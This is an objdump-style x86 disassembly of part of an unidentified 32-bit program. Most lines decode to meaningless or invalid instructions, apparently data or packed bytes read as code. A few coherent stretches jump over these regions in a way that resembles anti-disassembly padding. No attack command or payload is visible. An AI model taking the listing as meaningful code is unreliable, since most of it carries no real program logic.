  41d779:	clc    
  41d77a:	mov    ebx,DWORD PTR [ecx]
  41d77c:	sbb    edx,0xffffffdc
  41d77f:	adc    DWORD PTR [edi-0x60fdc1ad],edx
  41d785:	(bad)  
  41d786:	add    eax,DWORD PTR fs:0xa4f9f817
  41d78d:	dec    edx
  41d78e:	xor    bh,dh
  41d790:	push   0x43fa0c73
  41d795:	sub    al,0xe0
  41d797:	out    0x17,al
  41d799:	imul   ebx,esi,0x56
  41d79c:	cmp    BYTE PTR [edi],0x68
  41d79f:	retf   0x16a
  41d7a2:	inc    ebp
  41d7a3:	sub    eax,0xa8e01e16
  41d7a8:	cmp    bh,dl
  41d7aa:	enter  0x3179,0x9b
  41d7ae:	div    BYTE PTR [edx+edi*2-0x34]
  41d7b2:	xchg   edi,eax
  41d7b3:	pop    edx
  41d7b4:	mov    dh,bh
  41d7b6:	xor    DWORD PTR [edi+edx*1+0x52f9821d],edi
  41d7bd:	ins    DWORD PTR es:[edi],dx
  41d7be:	cmp    BYTE PTR [eax-0xc],0xc6
  41d7c2:	aam    0x75
  41d7c4:	rcl    DWORD PTR [eax],cl
  41d7c6:	mov    edx,0x550c8ae8
  41d7cb:	push   eax
  41d7cc:	scas   eax,DWORD PTR es:[edi]
  41d7cd:	pop    ss
  41d7ce:	je     0x41d768
  41d7d0:	fist   DWORD PTR [esp+eiz*8-0x1d3b1d30]
  41d7d7:	call   0x1c91:0xa978c9a7
  41d7de:	jbe    0x41d833
  41d7e0:	mov    ebx,0x2c0834d5
  41d7e5:	arpl   bx,si
  41d7e7:	xor    DWORD PTR [edx],edx
  41d7e9:	pop    eax
  41d7ea:	push   es
  41d7eb:	add    eax,0x1cef87bc
  41d7f0:	iret   
  41d7f1:	xchg   ebp,eax
  41d7f2:	loop   0x41d83a
  41d7f4:	(bad)
  41d7f7:	xor    DWORD PTR [eax],esi
  41d7f9:	or     dl,bl
  41d7fb:	jmp    0xc27c:0xc5348ba5
  41d802:	add    bh,BYTE PTR [edx+0x5c]
  41d805:	int    0x57
  41d807:	push   ecx
  41d808:	imul   edx,DWORD PTR [ebx+eax*8-0x6],0xa45dc188
  41d810:	sar    BYTE PTR [edx+0x56063709],cl
  41d816:	shl    BYTE PTR [edx],cl
  41d818:	into   
  41d819:	add    edi,ebp
  41d81b:	xchg   esp,eax
  41d81c:	adc    BYTE PTR [ebp-0x29],bl
  41d81f:	xor    dl,al
  41d821:	scas   al,BYTE PTR es:[edi]
  41d822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d823:	test   eax,0x1a802909
  41d828:	test   ebp,ebx
  41d82a:	adc    BYTE PTR [edi+0x6695f50c],0xa
  41d831:	xor    eax,edx
  41d833:	pusha  
  41d834:	inc    edx
  41d835:	fnstenv [ecx-0x41]
  41d838:	aam    0x1a
  41d83a:	into   
  41d83b:	sbb    BYTE PTR [ecx-0x30],0x97
  41d83f:	add    esp,edx
  41d841:	xchg   edx,eax
  41d842:	cmp    DWORD PTR [ebp-0x1b90f49b],ebx
  41d848:	pop    eax
  41d849:	pop    esp
  41d84a:	into   
  41d84b:	pop    ecx
  41d84c:	xchg   edi,eax
  41d84d:	xor    eax,0x4f2c1900
  41d852:	adc    al,BYTE PTR [esi+0x252265dc]
  41d858:	lods   eax,DWORD PTR ds:[esi]
  41d859:	fcmovnb st,st(4)
  41d85b:	inc    ebx
  41d85c:	hlt    
  41d85d:	cwde   
  41d85e:	stos   DWORD PTR es:[edi],eax
  41d85f:	add    cl,BYTE PTR [ebx+0x67ec1b10]
  41d865:	ss push ebp
  41d867:	cmp    esp,esp
  41d869:	push   edx
  41d86a:	pop    ds
  41d86b:	cmp    ebp,edi
  41d86d:	sbb    dh,BYTE PTR [eax+0x556e6d1e]
  41d873:	inc    edi
  41d874:	adc    al,0x56
  41d876:	pop    ebx
  41d877:	xchg   ebp,eax
  41d878:	cmp    ebx,DWORD PTR [ecx-0x59202498]
  41d87e:	imul   eax,DWORD PTR [eax-0x5d],0x3a
  41d882:	jnp    0x41d83a
  41d884:	add    edx,DWORD PTR [edi+0x1ea23e22]
  41d88a:	dec    ebx
  41d88b:	out    dx,al
  41d88c:	lahf   
  41d88d:	mov    al,0x27
  41d88f:	aad    0x3b
  41d891:	test   DWORD PTR [esi],ecx
  41d893:	stos   DWORD PTR es:[edi],eax
  41d894:	add    DWORD PTR [edi+ebp*1+0x7cdb9623],esp
  41d89b:	inc    eax
  41d89c:	adc    DWORD PTR [esp+edi*2-0x13bbabba],ebp
  41d8a3:	or     DWORD PTR ds:0x8e2d2a,edx
  41d8a9:	add    BYTE PTR [ebp+0x71],ah
  41d8ac:	out    0x71,eax
  41d8ae:	push   eax
  41d8af:	mov    cl,0x2e
  41d8b1:	arpl   WORD PTR [edx+0x0],si
  41d8b4:	loope  0x41d926
  41d8b6:	push   cs
  41d8b7:	das    
  41d8b8:	mov    esp,0x70b1644e
  41d8bd:	jmp    0x9008a3f9
  41d8c2:	mov    ch,dl
  41d8c4:	ja     0x41d859
  41d8c6:	aad    0x20
  41d8c8:	int3   
  41d8c9:	and    ecx,DWORD PTR [esi]
  41d8cb:	cmc    
  41d8cc:	dec    eax
  41d8cd:	arpl   WORD PTR [edx+edi*2-0x37b54794],dx
  41d8d4:	xchg   ecx,eax
  41d8d5:	mov    ds:0xc15a93f8,al
  41d8da:	and    BYTE PTR [esi+ebx*4+0x55],dl
  41d8de:	retf   
  41d8df:	jmp    0x6095e05e
  41d8e4:	call   0xf005:0xbb720d22
  41d8eb:	ins    DWORD PTR es:[edi],dx
  41d8ec:	push   es
  41d8ed:	pushw  cs
  41d8ef:	pop    ss
  41d8f0:	or     ebp,ebx
  41d8f2:	xchg   edi,eax
  41d8f3:	cmp    esp,DWORD PTR [eax-0x2c5f5b55]
  41d8f9:	stos   DWORD PTR es:[edi],eax
  41d8fa:	adc    al,0x5
  41d8fc:	jge    0x41d88f
  41d8fe:	xor    eax,0x5c203d5d
  41d903:	pop    ecx
  41d904:	out    0x2d,eax
  41d906:	fadd   DWORD PTR [ebp+0x1824548b]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422568
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x6f8d01bc,eax
  41d941:	mov    al,0x7f
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x11e01818],bh
  41d94c:	jae    0x41d97d
  41d94e:	retf   0xbc55
  41d951:	repnz or ebp,DWORD PTR [edi+0xe]
  41d955:	add    esi,DWORD PTR [esp+edi*4+0x1]
  41d959:	les    ebx,FWORD PTR ds:0x127321ac
  41d95f:	or     eax,DWORD PTR [ebx]
  41d961:	sub    ebp,edx
  41d963:	xor    ebp,DWORD PTR [esi]
  41d965:	adc    BYTE PTR [edi-0x1b],ah
  41d968:	fistp  QWORD PTR [esi-0x4f1c88d3]
  41d96e:	fxch   st(4)
  41d970:	xchg   edi,eax
  41d971:	jg     0x41d94a
  41d973:	dec    ebp
  41d974:	pusha  
  41d975:	push   ds
  41d976:	jge    0x41d937
  41d978:	cmp    BYTE PTR [edx+0x6e],0xe7
  41d97c:	mov    BYTE PTR ds:0xfa9d471a,al
  41d982:	push   edi
  41d983:	or     ah,bl
  41d985:	jne    0x41d99e
  41d987:	push   eax
  41d988:	(bad)  
  41d989:	mov    cl,0xc7
  41d98b:	mov    ds:0x97d89608,eax
  41d990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d991:	push   cs
  41d992:	scas   eax,DWORD PTR es:[edi]
  41d993:	xchg   esi,eax
  41d994:	loop   0x41d91b
  41d996:	xchg   ecx,eax
  41d997:	jecxz  0x41d96c
  41d999:	sub    DWORD PTR [edi-0x3d56e15f],0xffffff98
  41d9a0:	lock mov dh,0x9d
  41d9a3:	sub    al,0xb0
  41d9a5:	jno    0x41d9b2
  41d9a7:	sub    dh,BYTE PTR [ebp+0x75]
  41d9aa:	push   esi
  41d9ab:	pop    edi
  41d9ac:	lea    esp,ds:0xe7b736b
  41d9b2:	xchg   esi,esp
  41d9b4:	aam    0xe8
  41d9b6:	(bad)  
  41d9b7:	fs inc esp
  41d9b9:	lods   eax,DWORD PTR ds:[esi]
  41d9ba:	xor    DWORD PTR [esi],0x290f09e6
  41d9c0:	adc    al,0x4d
  41d9c2:	fldenv [edx-0x50]
  41d9c5:	test   BYTE PTR [eax],dl
  41d9c7:	push   ebp
  41d9c8:	test   ax,0x668b
  41d9cc:	outs   dx,BYTE PTR ds:[esi]
  41d9cd:	sub    eax,DWORD PTR es:[ebp-0x66fa0e9d]
  41d9d4:	mov    esp,0xeb64bb72
  41d9d9:	test   al,0x97
  41d9db:	xchg   edx,eax
  41d9dc:	jmp    0xf71c66d3
  41d9e1:	call   0xe3e3bf22
  41d9e6:	sbb    eax,0x415d236e
  41d9eb:	je     0x41d9de
  41d9ed:	jl     0x41d9f4
  41d9ef:	or     edi,DWORD PTR [eax+esi*2-0x1669e5d1]
  41d9f6:	loopne 0x41da2f
  41d9f8:	cdq    
  41d9f9:	dec    ecx
  41d9fa:	fist   WORD PTR [ebx+0x1d]
  41d9fd:	cld    
  41d9fe:	push   es
  41d9ff:	mov    eax,ds:0x4f888dd1
  41da04:	ror    DWORD PTR [esi+0x1b],0x20
  41da08:	and    DWORD PTR ss:[esi-0x6cbf5a6],esi
  41da0f:	(bad)  
  41da10:	daa    
  41da11:	mul    dh
  41da13:	in     al,0x7a
  41da15:	cmp    esp,DWORD PTR [ebp-0x47]
  41da18:	fadd   QWORD PTR [ebx]
  41da1a:	sar    DWORD PTR [ebp-0x3f],cl
  41da1d:	mov    esp,0x79c6ac8b
  41da22:	mov    edx,0x605ccb21
  41da27:	icebp  
  41da28:	add    ch,BYTE PTR [edi]
  41da2a:	sbb    al,0xc7
  41da2c:	test   al,0x63
  41da2e:	dec    edx
  41da2f:	dec    esi
  41da30:	clc    
  41da31:	push   esi
  41da32:	sub    dl,BYTE PTR [eax-0x6a]
  41da35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da36:	pop    ss
  41da37:	les    ebx,FWORD PTR [ebp-0x6703965]
  41da3d:	call   0xe63b0099
  41da42:	dec    esi
  41da43:	or     ecx,edx
  41da45:	push   ds
  41da46:	dec    ecx
  41da47:	cmp    esi,eax
  41da49:	sbb    edi,DWORD PTR [esi+0x17afa41]
  41da4f:	push   cs
  41da50:	icebp  
  41da51:	add    cl,al
  41da53:	sbb    eax,0x1ae268d3
  41da58:	and    ebx,esp
  41da5a:	jno    0x41da41
  41da5c:	fld    DWORD PTR [edx+0x655baef8]
  41da62:	(bad)  
  41da63:	fs mov edx,0x883d9f9e
  41da69:	add    bp,WORD PTR [ebx+ebx*4]
  41da6d:	js     0x41da2b
  41da6f:	jmp    0x6de169b4
  41da74:	xchg   esi,eax
  41da75:	adc    DWORD PTR [ecx+0x7],edi
  41da78:	adc    al,BYTE PTR [edx]
  41da7a:	(bad)  
  41da7b:	ss inc edi
  41da7d:	imul   eax,ecx,0x82d82cef
  41da83:	inc    eax
  41da84:	and    DWORD PTR [edi-0x63],ebp
  41da87:	sbb    al,0x71
  41da89:	xchg   esi,eax
  41da8a:	sub    bh,dl
  41da8c:	push   ecx
  41da8d:	fist   WORD PTR [edx]
  41da8f:	add    al,BYTE PTR [ebp+edx*4-0x2f]
  41da93:	les    edi,FWORD PTR [edi]
  41da95:	jns    0x41da3b
  41da97:	jno    0x41da5c
  41da99:	cli    
  41da9a:	adc    BYTE PTR [ebx],al
  41da9c:	inc    eax
  41da9d:	test   dl,dl
  41da9f:	dec    ecx
  41daa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa1:	xor    eax,0xd3804180
  41daa6:	or     eax,0xfdf21411
  41daab:	dec    eax
  41daac:	inc    ebp
  41daad:	dec    ecx
  41daae:	lods   eax,DWORD PTR ds:[esi]
  41daaf:	(bad)  
  41dab0:	pop    ebp
  41dab1:	das    
  41dab2:	sub    al,0xd7
  41dab4:	cmp    ecx,DWORD PTR [ecx+0x304e5b72]
  41daba:	jl     0x41dad9
  41dabc:	xor    al,0x8b
  41dabe:	xchg   edi,eax
  41dabf:	or     al,0x4a
  41dac1:	leave  
  41dac2:	sbb    BYTE PTR [ebp-0x4f],0x3f
  41dac6:	pop    ebx
  41dac7:	hlt    
  41dac8:	test   eax,0xa2410b8b
  41dacd:	std    
  41dace:	nop
  41dacf:	xlat   BYTE PTR ds:[ebx]
  41dad0:	push   es
  41dad1:	add    eax,DWORD PTR [edx-0x62]
  41dad4:	mov    dl,0x6c
  41dad6:	xchg   edx,eax
  41dad7:	call   0xca7ad25e
  41dadc:	or     dl,BYTE PTR [edx-0x13]
  41dadf:	popa   
  41dae0:	and    dh,bh
  41dae2:	adc    al,0x7b
  41dae4:	(bad)  
  41dae5:	ds fadd st(0),st
  41dae8:	cmp    ebx,DWORD PTR [ebp+0x6e]
  41daeb:	sar    DWORD PTR [esi],1
  41daed:	std    
  41daee:	and    eax,0x126c6474
  41daf3:	xor    eax,0x2a8096c
  41daf8:	add    al,0x75
  41dafa:	fwait
  41dafb:	out    0x55,eax
  41dafd:	push   eax
  41dafe:	leave  
  41daff:	das    
  41db00:	pop    esi
  41db01:	nop
  41db02:	mov    cl,0xa5
  41db04:	bound  edx,QWORD PTR [eax-0x76]
  41db07:	mov    DWORD PTR [ebp-0x24632996],esp
  41db0d:	out    0x64,eax
  41db0f:	sub    edi,DWORD PTR [ebp-0x68]
  41db12:	pop    es
  41db13:	test   al,0x8f
  41db15:	lods   al,BYTE PTR ds:[esi]
  41db16:	or     ebp,DWORD PTR [edi-0x2a4e1fd3]
  41db1c:	repz or al,BYTE PTR [eax+ecx*2-0x71]
  41db21:	dec    edi
  41db22:	pop    esi
  41db23:	or     BYTE PTR [edi+0x43],0x86
  41db27:	xor    DWORD PTR [esi],eax
  41db29:	pop    edi
  41db2a:	aas    
  41db2b:	dec    esi
  41db2c:	call   0x897c:0xa406a25a
  41db33:	sbb    esp,DWORD PTR [ecx+eax*4-0x23]
  41db37:	pop    DWORD PTR [esi+0x46]
  41db3a:	out    dx,eax
  41db3b:	(bad)  
  41db3d:	fnsave [edx+0x79]
  41db40:	pop    es
  41db41:	pop    ebx
  41db42:	and    eax,0x2443c6e6
  41db47:	mov    DWORD PTR [edi],eax
  41db49:	test   eax,0x69cf88e8
  41db4e:	das    
  41db4f:	fidiv  WORD PTR ds:0x68525312
  41db55:	inc    edi
  41db56:	pop    ds
  41db57:	test   DWORD PTR [edi+0x4e],ebx
  41db5a:	pop    ebp
  41db5b:	daa    
  41db5c:	imul   ebp,DWORD PTR [edx],0x29
  41db5f:	in     al,0x94
  41db61:	enter  0xe995,0xa1
  41db65:	imul   edx,DWORD PTR [ecx-0x6],0x962d96fd
  41db6c:	mov    bl,0x91
  41db6e:	stos   DWORD PTR es:[edi],eax
  41db6f:	ret    
  41db70:	mov    al,BYTE PTR [ecx-0x3199c3a9]
  41db76:	and    BYTE PTR [ecx],dl
  41db78:	mov    ecx,0x9e619331
  41db7d:	outs   dx,BYTE PTR ds:[esi]
  41db7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db7f:	enter  0x112e,0xd
  41db83:	xchg   BYTE PTR [ebp-0x44],dh
  41db86:	mov    cl,0x7f
  41db88:	cmp    al,0x0
  41db8a:	dec    esi
  41db8b:	retf   0x553c
  41db8e:	mov    ds:0xd9c5cb39,al
  41db93:	data16 in al,dx
  41db95:	inc    ebx
  41db96:	fs xchg edx,eax
  41db98:	out    dx,al
  41db99:	ins    DWORD PTR es:[edi],dx
  41db9a:	loope  0x41dbb0
  41db9c:	sbb    BYTE PTR [ebp+0x75],ch
  41db9f:	dec    esi
  41dba0:	or     al,0x4b
  41dba2:	lds    edi,FWORD PTR [eax]
  41dba4:	sbb    cl,bh
  41dba6:	pop    ebx
  41dba7:	ins    BYTE PTR es:[edi],dx
  41dba8:	mov    esp,0x2dfb103f
  41dbad:	out    dx,al
  41dbae:	jmp    FWORD PTR [ebx]
  41dbb0:	mov    ss,WORD PTR [esi+0x4047b14b]
  41dbb6:	mov    dh,0xbd
  41dbb8:	stc    
  41dbb9:	jmp    0x41dc35
  41dbbb:	inc    edi
  41dbbc:	imul   edx,DWORD PTR [ecx-0x702d193f],0x7a
  41dbc3:	fs jg  0x41dc30
  41dbc6:	je     0x41db6e
  41dbc8:	push   edx
  41dbc9:	fiadd  DWORD PTR [ecx]
  41dbcb:	aas    
  41dbcc:	xchg   edx,eax
  41dbcd:	xchg   esp,eax
  41dbce:	mov    ah,0xaa
  41dbd0:	ss jg  0x41db97
  41dbd3:	scas   eax,DWORD PTR es:[edi]
  41dbd4:	xchg   ah,cl
  41dbd6:	rcl    DWORD PTR [esi+0x58d3ba12],1
  41dbdc:	add    BYTE PTR ds:[eax+0x6bfdb456],ch
  41dbe3:	xlat   BYTE PTR ds:[ebx]
  41dbe4:	pop    esi
  41dbe5:	sbb    ah,BYTE PTR [esi]
  41dbe7:	sbb    BYTE PTR [ecx],bh
  41dbe9:	and    DWORD PTR [edi],esi
  41dbeb:	pop    esi
  41dbec:	les    esi,FWORD PTR [edx+0x5e0834cd]
  41dbf2:	sbb    esp,DWORD PTR [ebp-0x24]
  41dbf5:	imul   BYTE PTR [ebp-0x2b]
  41dbf8:	mov    eax,0x330d527d
  41dbfd:	mov    bl,0xc5
  41dbff:	or     DWORD PTR [esi-0x30],0x64
  41dc03:	mov    ecx,0x33b787e2
  41dc08:	mov    eax,0x9cc28476
  41dc0d:	daa    
  41dc0e:	pop    esp
  41dc0f:	ins    BYTE PTR es:[edi],dx
  41dc10:	icebp  
  41dc11:	dec    edi
  41dc12:	aam    0xca
  41dc14:	outs   dx,BYTE PTR ds:[esi]
  41dc15:	ss xor ecx,eax
  41dc18:	fbld   TBYTE PTR [edi]
  41dc1a:	mov    ebp,0xfa87ad90
  41dc1f:	cli    
  41dc20:	mov    bh,0xa2
  41dc22:	arpl   WORD PTR [eax],si
  41dc24:	inc    edi
  41dc25:	lock xchg BYTE PTR [ecx+0x61],al
  41dc29:	pop    ss
  41dc2a:	cmp    eax,0x539cf39
  41dc2f:	es (bad) 
  41dc31:	sub    ah,BYTE PTR [ebx-0x47]
  41dc34:	cwde   
  41dc35:	dec    edx
  41dc36:	outs   dx,DWORD PTR ds:[esi]
  41dc37:	cmp    sp,WORD PTR [ebx]
  41dc3a:	sbb    al,0x71
  41dc3c:	aam    0x8d
  41dc3e:	jp     0x41dc7c
  41dc40:	test   DWORD PTR [ebp*1+0x462d175c],ebp
  41dc47:	ret    
  41dc48:	test   eax,0x65a0cf5d
  41dc4d:	jecxz  0x41dcae
  41dc4f:	mov    dh,0x7b
  41dc51:	dec    esp
  41dc52:	fsub   DWORD PTR [ebx+0x6a75281e]
  41dc58:	and    edx,DWORD PTR [ebp+0x74]
  41dc5b:	xchg   ebp,eax
  41dc5c:	lss    edx,FWORD PTR [esi+0x2e6c7d16]
  41dc63:	inc    DWORD PTR [edx-0x6106ac62]
  41dc69:	test   eax,0xa564bf75
  41dc6e:	pop    edi
  41dc6f:	add    edi,0xffffffac
  41dc72:	jno    0x41dc04
  41dc74:	mov    esi,0xe2f87f4b
  41dc79:	xor    DWORD PTR [edx],ebp
  41dc7b:	xchg   BYTE PTR [ebx+0x42],ch
  41dc7e:	push   eax
  41dc7f:	in     eax,dx
  41dc80:	and    al,0x3
  41dc82:	pop    ss
  41dc83:	and    ah,BYTE PTR ds:0xa797d3f8
  41dc89:	outs   dx,BYTE PTR ds:[esi]
  41dc8a:	adc    al,0xc3
  41dc8c:	mov    bh,0x4
  41dc8e:	mov    DWORD PTR [edx-0x62],eax
  41dc91:	pop    edi
  41dc92:	jbe    0x41dc2e
  41dc94:	cwde   
  41dc95:	test   eax,0xb1900439
  41dc9a:	xlat   BYTE PTR ds:[ebx]
  41dc9b:	and    al,0xf5
  41dc9d:	rcr    BYTE PTR [eax],cl
  41dc9f:	jb     0x41dd13
  41dca1:	cwde   
  41dca2:	jmp    0xd446:0xb44c92e7
  41dca9:	add    al,0x99
  41dcab:	aas    
  41dcac:	shl    DWORD PTR [edx+0x17b41d89],0x76
  41dcb3:	inc    esi
  41dcb4:	mov    bl,dl
  41dcb6:	int3   
  41dcb7:	sub    edi,DWORD PTR [ebx]
  41dcb9:	fwait
  41dcba:	gs xchg ebp,eax
  41dcbc:	shl    DWORD PTR [esi+eax*2+0x143cfe2],cl
  41dcc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc4:	xor    BYTE PTR [edi+0x6a4b55c7],dh
  41dcca:	ret    0xdeda
  41dccd:	les    eax,FWORD PTR [esi+0x4a29ecf6]
  41dcd3:	cdq    
  41dcd4:	(bad)  
  41dcd5:	retf   0x974a
  41dcd8:	fsub   QWORD PTR [ebp-0x4d64b4eb]
  41dcde:	push   eax
  41dcdf:	or     ebp,DWORD PTR [ecx]
  41dce1:	in     eax,dx
  41dce2:	test   DWORD PTR [eax+0x3bdc2e40],edx
  41dce8:	fbstp  TBYTE PTR [ebp-0x17]
  41dceb:	jne    0x41dca6
  41dced:	aad    0x18
  41dcef:	xchg   esi,eax
  41dcf0:	popf   
  41dcf1:	out    0x8c,eax
  41dcf3:	in     al,0x29
  41dcf5:	enter  0xd920,0xeb
  41dcf9:	sti    
  41dcfa:	aas    
  41dcfb:	dec    ebx
  41dcfc:	lea    eax,[esp+0x6c]
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x34
  41dd5b:	add    eax,0x4722beeb
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x51aee7e8],bh
  41dd68:	imul   edi,eax,0xebb7a5db
  41dd6e:	add    ebx,ebx
  41dd70:	jno    0x41dd9b
  41dd72:	popf   
  41dd73:	jb     0x41dde1
  41dd75:	and    BYTE PTR [ecx+0x450e0ada],dl
  41dd7b:	sti    
  41dd7c:	mov    es,WORD PTR [esi-0x4c]
  41dd7f:	aad    0xde
  41dd81:	fwait
  41dd82:	inc    eax
  41dd83:	add    DWORD PTR [ebx+0x7cafefef],edi
  41dd89:	jne    0x41dd63
  41dd8b:	mov    cl,0xcd
  41dd8d:	xor    al,0x20
  41dd8f:	scas   al,BYTE PTR es:[edi]
  41dd90:	mov    bl,0x3d
  41dd92:	stos   BYTE PTR es:[edi],al
  41dd93:	add    eax,DWORD PTR [ebx+edx*2]
  41dd96:	and    dh,ch
  41dd98:	arpl   WORD PTR [ecx-0x66],ax
  41dd9b:	push   cs
  41dd9c:	dec    edx
  41dd9d:	mov    BYTE PTR [edi-0x6fc1dcec],0x36
  41dda4:	into   
  41dda5:	dec    eax
  41dda6:	jns    0x41ddeb
  41dda8:	test   al,0xd7
  41ddaa:	int3   
  41ddab:	mov    dh,0x72
  41ddad:	pop    ecx
  41ddae:	test   eax,0xe3113f89
  41ddb3:	pop    eax
  41ddb4:	retf   
  41ddb5:	dec    eax
  41ddb6:	mov    eax,0x6bdeed56
  41ddbb:	addr16 jnp 0x41de0c
  41ddbe:	pop    eax
  41ddbf:	ret    0xe972
  41ddc2:	je     0x41dde4
  41ddc4:	int    0xdb
  41ddc6:	fnstenv [edx]
  41ddc8:	xor    al,0x60
  41ddca:	xor    eax,0x27e2343b
  41ddcf:	jg     0x41ddb2
  41ddd1:	loope  0x41dde2
  41ddd3:	pushf  
  41ddd4:	xor    BYTE PTR [ecx-0x41],cl
  41ddd7:	push   esi
  41ddd8:	mov    cl,0xbe
  41ddda:	pop    ebp
  41dddb:	out    dx,eax
  41dddc:	adc    al,0xac
  41ddde:	mov    edi,0x32ad8771
  41dde3:	mov    BYTE PTR [ebx],dh
  41dde5:	jge    0x41de45
  41dde7:	add    edi,DWORD PTR [esi+0x1a]
  41ddea:	loop   0x41de01
  41ddec:	adc    eax,0x6264e699
  41ddf1:	mov    bl,0xab
  41ddf3:	loopne 0x41dd97
  41ddf5:	cli    
  41ddf6:	jecxz  0x41de54
  41ddf8:	sahf   
  41ddf9:	mov    DWORD PTR [esi],edi
  41ddfb:	or     ebp,ebp
  41ddfd:	xchg   ebp,ebx
  41ddff:	jmp    0x8e4c:0xded06f22
  41de06:	sbb    DWORD PTR [ebx+0xb7fe56b],ebx
  41de0c:	mov    ebx,0xaa81efe2
  41de11:	int    0xfc
  41de13:	outs   dx,BYTE PTR ds:[si]
  41de15:	and    bl,BYTE PTR [ecx+edx*4+0x7e]
  41de19:	mov    dh,0x70
  41de1b:	xchg   cl,ah
  41de1d:	lods   al,BYTE PTR ds:[esi]
  41de1e:	mov    eax,0xcce6e228
  41de23:	loope  0x41de95
  41de25:	push   ss
  41de26:	scas   al,BYTE PTR es:[edi]
  41de27:	add    BYTE PTR [esi+eax*8-0x62],cl
  41de2b:	retf   0x236b
  41de2e:	adc    DWORD PTR [esi-0x41],esp
  41de31:	xor    al,0x34
  41de33:	retf   
  41de34:	(bad)  
  41de35:	ins    BYTE PTR es:[edi],dx
  41de36:	adc    ch,BYTE PTR [ecx+edi*8]
  41de39:	sbb    DWORD PTR [ebx-0x72],ebx
  41de3c:	ret    0x40b1
  41de3f:	outs   dx,BYTE PTR ds:[esi]
  41de40:	sbb    ecx,eax
  41de42:	mov    ds:0x3ec5b8b8,eax
  41de47:	(bad)  
  41de48:	xchg   DWORD PTR ds:0x3a6855b4,esp
  41de4e:	aad    0xfa
  41de50:	mov    bh,0xfe
  41de52:	stos   BYTE PTR es:[edi],al
  41de53:	out    dx,eax
  41de54:	arpl   WORD PTR [ebp-0x626bdae3],bx
  41de5a:	inc    ebp
  41de5b:	inc    DWORD PTR [ecx+0x3e]
  41de5e:	shr    BYTE PTR [eax+0xb],cl
  41de61:	or     eax,0xf181aad5
  41de66:	imul   ebx,DWORD PTR [esi+0x4dab39ae],0x168bff7c
  41de70:	dec    ebx
  41de71:	aas    
  41de72:	sub    eax,0x9dc056c4
  41de77:	bound  ecx,QWORD PTR [edx]
  41de79:	pushf  
  41de7a:	mov    bh,0xe4
  41de7c:	or     BYTE PTR [ebx+0x51],dl
  41de7f:	mov    ebx,0x2a937b6
  41de84:	aam    0x83
  41de86:	pop    esi
  41de87:	dec    ebx
  41de88:	int    0x1e
  41de8a:	xor    al,0xbf
  41de8c:	stos   DWORD PTR es:[edi],eax
  41de8d:	data16 jno 0x41decb
  41de90:	add    BYTE PTR [ecx+0xc],dh
  41de93:	adc    esp,0xffffffcb
  41de96:	sub    DWORD PTR [eax],0x47c21ef3
  41de9c:	mov    ebx,0xd953d21c
  41dea1:	(bad)  
  41dea3:	nop
  41dea4:	clc    
  41dea5:	cli    
  41dea6:	dec    ebx
  41dea7:	mov    al,ds:0x73634d55
  41deac:	jecxz  0x41de5c
  41deae:	mov    ds:0x2335e4fb,eax
  41deb3:	outs   dx,DWORD PTR ds:[esi]
  41deb4:	mov    eax,0xd14a7aa9
  41deb9:	jecxz  0x41de96
  41debb:	test   BYTE PTR [eax-0x5eebde5c],ch
  41dec1:	fist   WORD PTR [edi-0x7815d7c5]
  41dec7:	sti    
  41dec8:	adc    ebp,ebx
  41deca:	fldcw  WORD PTR [ebx+ebp*1-0x44]
  41dece:	xor    al,0x4f
  41ded0:	dec    esi
  41ded1:	mov    bh,0xb4
  41ded3:	fld    st(3)
  41ded5:	dec    esi
  41ded6:	fmul   DWORD PTR [edi]
  41ded8:	jmp    0x43e4dd56
  41dedd:	out    0x7c,al
  41dedf:	pop    esi
  41dee0:	pop    ds
  41dee1:	(bad)  
  41dee2:	mov    edi,0x46232189
  41dee7:	or     eax,0x57810165
  41deec:	ffree  st(7)
  41deee:	iret   
  41deef:	inc    eax
  41def0:	fwait
  41def1:	sub    eax,0x78ddc6d0
  41def6:	dec    eax
  41def7:	test   eax,0x5d7dfaf5
  41defc:	ret    0x1b73
  41deff:	hlt    
  41df00:	and    al,0x52
  41df02:	mov    esp,0xb92ba341
  41df07:	out    0x4b,al
  41df09:	pop    ss
  41df0a:	mov    ebp,0x50ca43f0
  41df0f:	scas   eax,DWORD PTR es:[edi]
  41df10:	fmul   QWORD PTR [ecx+0x32d12ecc]
  41df16:	add    al,0xa6
  41df18:	je     0x41dec4
